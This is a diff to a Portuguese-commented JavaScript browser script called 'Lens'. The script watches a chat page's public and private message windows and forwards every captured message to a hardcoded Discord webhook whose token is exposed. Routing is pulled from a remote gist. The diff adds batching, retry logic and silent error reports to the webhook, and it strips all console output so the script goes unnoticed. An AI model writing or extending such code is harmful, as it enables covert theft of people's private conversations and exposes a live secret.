@@ -9,6 +9,8 @@
     // ============================================================
     // CONFIG
     // ============================================================
+    var LENS_VERSION = '2.0.0';
+
     var DEFAULT_WEBHOOK = 'https://discord.com/api/webhooks/1529335560240496773/rLO9IMqqb05_dT75Rxu51kX8wxzl_10UmNkhh-dmvqUfDQxLCZbKa8ziXvWLDxZdBBV0';
     var CONFIG_URL = 'https://gist.githubusercontent.com/zBeyond5/aac262f7fa7ad61ba4bb9d47e80cfe37/raw/6cf12524bcaaa34b86484746799ad54c5a1e63e8/lens.json';
 
@@ -23,15 +25,23 @@
     var PRIVATE_SKIP_HISTORY = true;
     var PRIVATE_PING = '<@&1552637564597436537>';
     var PRIVATE_FIRST_SCAN_DELAY = 300;
+
+    var DEBUG_GROUP_MS = 3000;
+    var DEBUG_STACK_MAX = 700;
+
+    var FLUSH_BATCH = 5;
+    var FLUSH_DELAY = 400;
+    var MAX_QUEUE = 5000;
     // ============================================================
 
-    var DEBUG = false;
     var MSG_TEMPLATE = '**{user}**: {msg}';
     var HEADER_INTERVAL = 60 * 1000;
     var CONFIG_REFRESH_MS = 5 * 60 * 1000;
     var PUBLIC_SKIP_HISTORY = true;
     var MIN_MSG_LEN = 1;
     var SCAN_DEBOUNCE_MS = 80;
+    var RETRY_5XX_MS = 2000;
+    var RETRY_FALLBACK_MS = 1500;
 
     var SEL_PRIMARY = '.chat-content';
     var SEL_BUBBLE = '.bubble-container';
@@ -55,9 +65,73 @@
     var _announcedHash = null;
     var _started = false;
 
-    function _log() {
-        if (DEBUG) console.log.apply(console, ['[Lens:' + _sessionHash + ']'].concat(Array.prototype.slice.call(arguments)));
+    // Última "voz" emitida — usada para agrupar mensagens consecutivas
+    // do mesmo remetente na mesma direção. Chave: 'pub:<user>' ou
+    // 'priv:<arrow>:<user>'. Resetada em headers, trocas de janela privada,
+    // e alertas (@everyone) para garantir que o nome sempre apareça em
+    // contextos novos.
+    var _lastSpeakerKey = null;
+
+    var _metrics = {
+        sent: 0,
+        failed: 0,
+        rateLimited: 0,
+        retries: 0,
+        lastErrorAt: 0,
+        lastErrorKind: '',
+        queueDropped: 0,
+        debugSent: 0,
+        debugSuppressed: 0
+    };
+
+    // ================= DEBUG (silencioso, vai pro webhook padrão) =================
+    var _dbgLastAt = 0;
+    var _dbgSuppressed = 0;
+
+    function _debugReport(kind, err, ctx) {
+        if (!DEFAULT_WEBHOOK) return;
+
+        var now = Date.now();
+        if (now - _dbgLastAt < DEBUG_GROUP_MS) {
+            _dbgSuppressed++;
+            _metrics.debugSuppressed++;
+            return;
+        }
+        _dbgLastAt = now;
+
+        var suppressed = _dbgSuppressed;
+        _dbgSuppressed = 0;
+
+        var detail = '';
+        try {
+            if (err && err.stack) detail = String(err.stack);
+            else if (err && err.message) detail = String(err.message);
+            else if (err) detail = String(err);
+        } catch (e) { detail = '(não serializável)'; }
+
+        if (detail.length > DEBUG_STACK_MAX) detail = detail.slice(0, DEBUG_STACK_MAX) + '…';
+
+        var header = '⚠️ `' + String(kind) + '` · `v' + LENS_VERSION + '` · `' + (_deviceId || '?') + '`';
+        if (suppressed > 0) header += ' · +' + suppressed + ' supr.';
+        if (ctx) header += '\n> ' + String(ctx).slice(0, 160);
+
+        var body = detail ? '\n```\n' + detail + '\n```' : '';
+
+        try {
+            _metrics.debugSent++;
+            fetch(DEFAULT_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: header + body,
+                    username: 'Lens · debug',
+                    allowed_mentions: { parse: [] }
+                })
+            }).catch(_noop);
+        } catch (e) { /* silencioso */ }
     }
+
+    function _log() { /* no-op — nada exposto no console */ }
 
     // ================= SESSÃO =================
     function _persistentSeed() {
@@ -108,17 +182,22 @@
         var sep = CONFIG_URL.indexOf('?') === -1 ? '?' : '&';
         var url = CONFIG_URL + sep + 't=' + Date.now();
         return fetch(url, { cache: 'no-store' })
-            .then(function(r) { return r.ok ? r.json() : null; })
+            .then(function(r) {
+                if (!r.ok) throw new Error('config HTTP ' + r.status);
+                return r.json();
+            })
             .then(function(j) {
                 if (j && typeof j === 'object') {
                     _remoteConfig = j;
                     _remoteConfigAt = Date.now();
                     _applyConfig();
-                    _log('config atualizada:', Object.keys(j).length, 'sessões');
                 }
                 return _remoteConfig;
             })
-            .catch(function(e) { _log('config fetch falhou:', String(e)); return _remoteConfig; });
+            .catch(function(e) {
+                _debugReport('config-fetch', e, CONFIG_URL.slice(0, 80));
+                return _remoteConfig;
+            });
     }
 
     function _ensureConfigFresh() {
@@ -133,10 +212,7 @@
         var entry = _remoteConfig[id] || (_sessionHash && _remoteConfig[_sessionHash]);
         if (entry && entry.label) {
             var newLabel = String(entry.label);
-            if (newLabel !== _sessionLabel) {
-                _sessionLabel = newLabel;
-                _log('label atualizado:', newLabel);
-            }
+            if (newLabel !== _sessionLabel) _sessionLabel = newLabel;
         }
     }
 
@@ -149,16 +225,26 @@
                     url: entry.webhook,
                     label: entry.label || '',
                     mapped: true,
-                    key: id
+                    key: id,
+                    disabled: entry.disabled === true
                 };
             }
         }
-        return { url: DEFAULT_WEBHOOK, label: '', mapped: false };
+        return { url: DEFAULT_WEBHOOK, label: '', mapped: false, disabled: false };
     }
 
     function _displayTag() {
+        var r = _route();
+        if (r.mapped) return r.label || (_deviceId || _sessionHash);
         var id = _deviceId || _sessionHash;
         return _sessionLabel ? (_sessionLabel + ' [' + id + ']') : id;
+    }
+
+    // ================= AGRUPAMENTO DE VOZ =================
+    // Chamado quando o contexto muda (novo bloco de tempo, janela privada
+    // abriu/fechou, alerta). Força o próximo emit a mostrar o nome do user.
+    function _resetSpeaker() {
+        _lastSpeakerKey = null;
     }
 
     // ================= TIME =================
@@ -252,15 +338,16 @@
         var peer = _privatePeer(el);
         var tag = _route().mapped ? _displayTag() : _sessionHash;
 
+        _resetSpeaker();
         _enqueue('━━━━━━━━ 🔒 ' + PRIVATE_PING + ' ━━━━━━━━');
         _enqueue('`' + _nowBrasilia() + '` 🔓 **janela privada ABERTA**' + (peer ? ' · **' + peer + '**' : '') + ' · ' + tag);
 
         _watchPrivateMsgs(el);
-        _log('private open', peer);
     }
 
     function _closePrivate() {
         var peer = _privatePeer(_privateEl);
+        _resetSpeaker();
         _enqueue('`' + _nowBrasilia() + '` 🔒 **janela privada FECHADA**' + (peer ? ' · **' + peer + '**' : ''));
         _enqueue('━━━━━━━━ 🔒 fim privado ━━━━━━━━');
 
@@ -269,13 +356,12 @@
         _privateMsgsEl = null;
         if (_privateMsgsObserver) { _privateMsgsObserver.disconnect(); _privateMsgsObserver = null; }
         _privateSeenEls = new WeakSet();
-        _log('private close');
     }
 
     function _watchPrivateMsgs(el) {
         var msgs = null;
         try { msgs = el.querySelector(PRIVATE_MSGS_SEL); } catch(e) {}
-        if (!msgs) { _log('private .chat-messages não achado'); return; }
+        if (!msgs) return;
         _privateMsgsEl = msgs;
         _privateMsgsObserver = new MutationObserver(function() { _scanPrivateMsgs(); });
         _privateMsgsObserver.observe(msgs, { childList: true, subtree: true, characterData: true });
@@ -309,9 +395,17 @@
 
     function _emitPrivateText(user, text, isSelf) {
         var arrow = isSelf ? '➡️' : '⬅️';
-        var line = '`' + _nowBrasilia() + '` 🔒 ' + arrow + ' **' + user + '**: ' + text;
-        _log('private emit:', user, '→', text);
-        _enqueue(line);
+        var key = 'priv:' + arrow + ':' + user;
+        var cont = (key === _lastSpeakerKey);
+
+        var body;
+        if (cont) {
+            body = '`' + _nowBrasilia() + '` 🔒 ' + arrow + ' ' + text;
+        } else {
+            body = '`' + _nowBrasilia() + '` 🔒 ' + arrow + ' **' + user + '**: ' + text;
+            _lastSpeakerKey = key;
+        }
+        _enqueue(body);
     }
 
     // ================= SCAN (público) =================
@@ -320,7 +414,6 @@
         var bubbles;
         try { bubbles = document.querySelectorAll(SEL_BUBBLE); } catch (e) { return; }
 
-        var emitted = 0;
         for (var i = 0; i < bubbles.length; i++) {
             var data = _extractFromBubble(bubbles[i]);
             if (!data) continue;
@@ -329,7 +422,6 @@
             _seen.add(key);
             if (initial && PUBLIC_SKIP_HISTORY) continue;
             _emit(data.user, data.msg);
-            emitted++;
         }
 
         if (_seen.size > 2000) {
@@ -339,7 +431,6 @@
                 if (d2) _seen.add(d2.user + '\u0000' + d2.msg);
             }
         }
-        if (emitted) _log('emitidos', emitted, 'novos');
     }
 
     function _scheduleScan() {
@@ -392,10 +483,24 @@
 
     function _emit(user, msg) {
         _ensureConfigFresh();
-        var prefix = _hasAlert(msg) ? (ALERT_PING + ' ') : '';
-        var line = prefix + '`' + _nowBrasilia() + '` ⬅️ ' + _format(user, msg);
-        _log('emit:', user, '→', msg, prefix ? '[ALERTA]' : '');
-        _enqueue(line);
+        var isAlert = _hasAlert(msg);
+        var prefix = isAlert ? (ALERT_PING + ' ') : '';
+
+        // Alerta quebra o agrupamento — o nome precisa reaparecer para
+        // deixar claro quem disparou o ping.
+        if (isAlert) _resetSpeaker();
+
+        var key = 'pub:' + user;
+        var cont = (key === _lastSpeakerKey);
+
+        var body;
+        if (cont) {
+            body = '`' + _nowBrasilia() + '` ⬅️ ' + msg;
+        } else {
+            body = '`' + _nowBrasilia() + '` ⬅️ ' + _format(user, msg);
+            _lastSpeakerKey = key;
+        }
+        _enqueue(prefix + body);
     }
 
     function _checkHeader() {
@@ -405,6 +510,8 @@
             var tag = r.mapped ? _displayTag() : ('novo · ' + (_deviceId || _sessionHash) + ' · mapeie no gist');
             _queue.push('━━━━━━━ 🕐 ' + _nowHHMM() + ' · ' + tag + ' ━━━━━━━');
             _lastHeaderTime = now;
+            // Novo bloco de tempo — a próxima mensagem sempre mostra o nome.
+            _resetSpeaker();
         }
     }
 
@@ -421,24 +528,45 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ content: line, username: 'Lens · ' + id })
-        }).catch(_noop);
+        }).catch(function(e) {
+            _debugReport('announce', e, id);
+        });
     }
 
     function _enqueue(line) {
         if (!line || line.length < 5) return;
         _checkHeader();
+
+        if (_queue.length >= MAX_QUEUE) {
+            var drop = _queue.length - MAX_QUEUE + 1;
+            _queue.splice(0, drop);
+            _metrics.queueDropped += drop;
+            _debugReport('queue-overflow', 'descartados ' + drop + ' itens', String(_queue.length));
+        }
+
         _queue.push(line);
         if (!_isSending) _flush();
     }
 
+    // ================= FLUSH (com rate limit) =================
     function _flush() {
         if (_isSending || _queue.length === 0) return;
         _isSending = true;
 
-        var target = _route().url;
-        var batch = _queue.splice(0, 5);
+        var r = _route();
+        var target = r.url;
+
+        if (!target || r.disabled) {
+            _queue.length = 0;
+            _isSending = false;
+            return;
+        }
+
+        var batch = _queue.splice(0, FLUSH_BATCH);
         var content = batch.join('\n');
         if (content.length > 1950) content = content.substring(0, 1950) + '...';
+
+        var retryDelay = null;
 
         fetch(target, {
             method: 'POST',
@@ -448,9 +576,50 @@
                 username: 'Lens · ' + _displayTag(),
                 allowed_mentions: { parse: ['everyone'], roles: ALLOWED_ROLES }
             })
-        }).catch(_noop).finally(function() {
+        })
+        .then(function(res) {
+            if (res.status === 429) {
+                _metrics.rateLimited++;
+                return res.json()
+                    .then(function(j) {
+                        var wait = (j && j.retry_after ? j.retry_after * 1000 : 1000) + 300;
+                        retryDelay = wait;
+                        _queue.unshift.apply(_queue, batch);
+                        _debugReport('rate-limit', 'aguardando ' + Math.round(wait) + 'ms', target.slice(-30));
+                    })
+                    .catch(function() {
+                        retryDelay = 1500;
+                        _queue.unshift.apply(_queue, batch);
+                        _debugReport('rate-limit', 'resposta não-JSON, backoff padrão');
+                    });
+            }
+
+            if (res.status >= 500) {
+                _metrics.retries++;
+                if (!batch._retried) {
+                    batch._retried = true;
+                    _queue.unshift.apply(_queue, batch);
+                    retryDelay = RETRY_5XX_MS;
+                    _debugReport('server-' + res.status, 'retentando batch', target.slice(-30));
+                    return;
+                }
+                throw new Error('HTTP ' + res.status + ' (após retry)');
+            }
+
+            if (!res.ok) throw new Error('HTTP ' + res.status);
+
+            _metrics.sent += batch.length;
+        })
+        .catch(function(e) {
+            _metrics.failed++;
+            _metrics.lastErrorAt = Date.now();
+            _metrics.lastErrorKind = 'flush';
+            _debugReport('flush', e, target.slice(-30));
+            retryDelay = RETRY_FALLBACK_MS;
+        })
+        .then(function() {
             _isSending = false;
-            setTimeout(_flush, 400);
+            setTimeout(_flush, retryDelay != null ? retryDelay : FLUSH_DELAY);
         });
     }
 
@@ -461,8 +630,6 @@
 
         _sessionHash = _computeHash();
         _deviceId = _getDeviceId();
-        _log('inicializando. device=' + _deviceId + ' session=' + _sessionHash);
-        try { console.log('%c[Lens]','color:#22d3ee;font-weight:bold','device ' + _deviceId + ' · window._lens.stats()'); } catch(e) {}
 
         _fetchConfig().then(function() {
             _applyConfig();
@@ -474,7 +641,6 @@
     }
 
     function kill() {
-        _log('desligando...');
         _queue.length = 0;
         _seen.clear();
         _stopObserver();
@@ -482,10 +648,12 @@
         _privateEl = null;
         _privateMsgsEl = null;
         _privateSeenEls = new WeakSet();
+        _lastSpeakerKey = null;
         _started = false;
         try { delete window._lens; } catch(e) {}
     }
 
+    // ================= API INTERNA =================
     Object.defineProperty(window, '_lens', {
         value: {
             kill: kill,
@@ -514,17 +682,39 @@
             privateOpen: function() { return _privateOpen; },
             privatePeer: function() { return _privatePeer(_privateEl); },
             privateScan: function() { _scanPrivateMsgs(); },
+            version: function() { return LENS_VERSION; },
             stats: function() {
                 return {
+                    version: LENS_VERSION,
                     deviceId: _deviceId,
                     sessionHash: _sessionHash,
                     label: _sessionLabel,
-                    route: _route(),
+                    route: {
+                        mapped: _route().mapped,
+                        label: _route().label,
+                        disabled: _route().disabled
+                    },
                     seen: _seen.size,
                     queue: _queue.length,
                     privateOpen: _privateOpen,
-                    privatePeer: _privatePeer(_privateEl)
+                    privatePeer: _privatePeer(_privateEl),
+                    lastSpeaker: _lastSpeakerKey,
+                    metrics: {
+                        sent: _metrics.sent,
+                        failed: _metrics.failed,
+                        rateLimited: _metrics.rateLimited,
+                        retries: _metrics.retries,
+                        queueDropped: _metrics.queueDropped,
+                        debugSent: _metrics.debugSent,
+                        debugSuppressed: _metrics.debugSuppressed,
+                        lastErrorAt: _metrics.lastErrorAt,
+                        lastErrorKind: _metrics.lastErrorKind
+                    }
                 };
+            },
+            reportTest: function() {
+                _debugReport('manual-test', 'chamado via _lens.reportTest()');
+                return 'sent';
             }
         },
         configurable: true,
